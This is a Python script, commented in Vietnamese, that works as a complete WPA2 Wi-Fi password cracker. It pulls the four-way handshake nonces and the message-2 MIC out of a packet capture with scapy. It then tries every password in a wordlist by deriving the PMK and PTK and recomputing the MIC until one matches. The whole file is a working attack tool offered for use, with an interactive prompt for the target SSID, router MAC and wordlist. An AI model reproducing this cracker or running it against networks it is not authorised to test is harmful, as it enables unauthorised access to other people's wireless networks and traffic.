import sys
import os
import time
import struct
import binascii
import hashlib
import hmac
# SỬA DÒNG NÀY: Thêm 'raw' vào import hoặc dùng import *
from scapy.all import rdpcap, EAPOL, Dot11, raw 

# ==========================================
# PHẦN 1: CÁC HÀM XỬ LÝ MÃ HÓA (CRYPTO)
# ==========================================

def derive_pmk(passphrase: str, ssid: str) -> bytes:
    # PBKDF2: 4096 rounds
    return hashlib.pbkdf2_hmac(
        'sha1', 
        passphrase.encode('utf-8'), 
        ssid.encode('utf-8'), 
        4096, 
        32
    )

def prf_512(key: bytes, A: bytes, B: bytes) -> bytes:
    n_bytes = 64
    i = 0
    R = b''
    while len(R) < n_bytes:
        hmacsha1 = hmac.new(key, A + b'\x00' + B + bytes([i]), hashlib.sha1)
        R += hmacsha1.digest()
        i += 1
    return R[:n_bytes]

def calculate_mic(kck: bytes, eapol_payload: bytes) -> bytes:
    # Zero out MIC field (Offset 81, length 16)
    eapol_zeroed = eapol_payload[:81] + (b'\x00' * 16) + eapol_payload[97:]
    mic = hmac.new(kck, eapol_zeroed, hashlib.sha1).digest()[:16]
    return mic

def extract_clean_eapol(pkt):
    try:
        # Cần hàm raw() để lấy bytes từ layer
        raw_bytes = raw(pkt[EAPOL]) 
        eapol_len = struct.unpack('>H', raw_bytes[2:4])[0]
        real_len = 4 + eapol_len
        return raw_bytes[:real_len]
    except Exception:
        # Nếu lỗi (ví dụ không import raw), nó sẽ return None
        return None

# ==========================================
# PHẦN 2: LOGIC TẤN CÔNG (CORE ENGINE)
# ==========================================

def wpa2_dictionary_attack(pcap_path, ssid, bssid_input, wordlist_path):
    bssid_clean = bssid_input.replace(':', '').replace('-', '').lower()
    
    print("\n" + "="*50)
    print(f"[*] ĐANG KHỞI TẠO TẤN CÔNG...")
    print(f"[*] SSID Mục tiêu : '{ssid}'")
    print(f"[*] BSSID (MAC)   : {bssid_input}")
    print(f"[*] File CAP      : {pcap_path}")
    print(f"[*] Wordlist      : {wordlist_path}")
    print("="*50 + "\n")

    if not os.path.exists(pcap_path):
        print(f"[!] Lỗi: Không tìm thấy file .cap tại {pcap_path}")
        return

    print(f"[*] Đang đọc file PCAP và lọc gói tin Handshake...")
    try:
        packets = rdpcap(pcap_path)
    except Exception as e:
        print(f"[!] Lỗi đọc file PCAP: {e}")
        return

    potential_anonces = set()
    msg2_targets = []

    # --- VÒNG LẶP LỌC GÓI TIN ---
    for pkt in packets:
        if pkt.haslayer(EAPOL):
            try:
                src = pkt[Dot11].addr2.replace(':', '').lower()
                dst = pkt[Dot11].addr1.replace(':', '').lower()
                
                clean_eapol = extract_clean_eapol(pkt)
                if not clean_eapol: continue
                
                key_info = struct.unpack('>H', clean_eapol[5:7])[0]
                nonce = clean_eapol[17:49]
                
                # Case 1: Tìm Anonce (Từ Router -> Client)
                if src == bssid_clean:
                    potential_anonces.add(bytes(nonce))

                # Case 2: Tìm Message 2 (Từ Client -> Router)
                elif dst == bssid_clean and (key_info & 0x0100):
                     # Bỏ qua Message 4 (Snonce = 0)
                     if int.from_bytes(nonce, 'big') == 0:
                         continue 

                     msg2_targets.append({
                        'client': src,
                        'snonce': nonce,
                        'mic_orig': clean_eapol[81:97],
                        'payload': clean_eapol
                    })
            except Exception as e:
                # print(f"Debug Skip: {e}")
                continue
    
    # Kiểm tra kết quả lọc
    if not msg2_targets:
        print("[-] THẤT BẠI: Không tìm thấy gói Message 2 hợp lệ.")
        print(f"    (Gợi ý: Kiểm tra lại MAC Router: {bssid_clean})")
        return
    
    if not potential_anonces:
        print("[-] THẤT BẠI: Không tìm thấy Anonce từ Router.")
        return

    print(f"[+] Đã thu thập được {len(potential_anonces)} Anonce và {len(msg2_targets)} gói Message 2.")
    print(f"[*] Bắt đầu chạy Dictionary Attack... (Nhấn Ctrl+C để dừng)\n")

    if not os.path.exists(wordlist_path):
        print(f"[!] Lỗi: Không tìm thấy file wordlist tại {wordlist_path}")
        return

    start_time = time.time()
    pass_count = 0

    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip('\n\r')
                if not password: continue
                pass_count += 1
                
                if pass_count % 100 == 0:
                    sys.stdout.write(f"\r[*] Đang thử mật khẩu thứ {pass_count}: {password}...")
                    sys.stdout.flush()

                try:
                    # Bước tốn tài nguyên nhất: Tính PMK
                    pmk = derive_pmk(password, ssid)
                except: continue 

                # Thử ghép PMK này với mọi cặp (Anonce + Msg2)
                for target in msg2_targets:
                    sta_mac_bytes = bytes.fromhex(target['client'])
                    ap_mac_bytes  = bytes.fromhex(bssid_clean)
                    
                    for anonce in potential_anonces:
                        B = (min(ap_mac_bytes, sta_mac_bytes) + max(ap_mac_bytes, sta_mac_bytes) +
                             min(anonce, target['snonce']) + max(anonce, target['snonce']))
                        
                        ptk = prf_512(pmk, b"Pairwise key expansion", B)
                        kck = ptk[0:16]
                        mic_calc = calculate_mic(kck, target['payload'])
                        
                        if mic_calc == target['mic_orig']:
                            end_time = time.time()
                            print(f"\n\n{'='*50}")
                            print(f">>> CRACK THÀNH CÔNG! <<<")
                            print(f"{'='*50}")
                            print(f"[+] Mật khẩu đúng : {password}")
                            print(f"[+] Thời gian chạy: {end_time - start_time:.2f} giây")
                            print(f"[+] Số pass đã thử: {pass_count}")
                            print(f"[+] MIC Check     : {binascii.hexlify(mic_calc).decode()}")
                            print(f"{'='*50}")
                            return

    except KeyboardInterrupt:
        print("\n[!] Đã dừng bởi người dùng.")
        return

    print(f"\n\n[-] Đã thử hết {pass_count} mật khẩu. Không tìm thấy.")

# ==========================================
# MAIN
# ==========================================
if __name__ == "__main__":
    try:
        print("--- TOOL CRACK WPA2 HANDSHAKE ---")
        pcap_in = input("1. File .cap        : ").strip().strip('"').strip("'")
        ssid_in = input("2. SSID (Tên Wifi)  : ") # Không strip() để giữ dấu cách nếu có
        mac_in  = input("3. MAC Router       : ").strip()
        word_in = input("4. File Wordlist    : ").strip().strip('"').strip("'")
        
        wpa2_dictionary_attack(pcap_in, ssid_in, mac_in, word_in)
        
    except KeyboardInterrupt:
        print("\n[!] Thoát.")